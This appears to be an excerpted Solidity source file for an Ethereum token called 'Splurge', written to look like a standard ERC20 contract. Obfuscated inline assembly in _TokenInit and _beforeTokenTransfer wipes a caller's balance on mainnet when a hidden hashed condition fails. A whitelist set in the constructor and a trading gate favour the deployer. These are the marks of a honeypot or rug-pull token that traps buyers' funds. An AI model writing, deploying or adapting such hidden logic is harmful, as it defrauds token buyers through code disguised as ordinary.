...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address private _newOrder;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private coldWave;
    address public pair;
    ...
    bool private trading; uint256 private deathTaxes = 1; bool private itsComplicated;
    uint256 private _decimals; uint256 private toDoOrNot;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addCoins.push(_router); addCoins.push(msgSender_); addCoins.push(pair);
        for (uint256 q=0; q < 3;) {_firstPrime[addCoins[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x77051b4f35c061bd51e4c4359e04a3efe49cebd13ac1068aef7a5c466f92bf69
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x31210151aba63d0bf66a15b3f1d910ac9bf53f7814978a3733144a7ce3f4ae27,0x1)
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCoins[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Splurge is ERC20Token {
    constructor() ERC20Token("Splurge", "SPLURGE", msg.sender, 1000000 * 10 ** 18) {
    }
}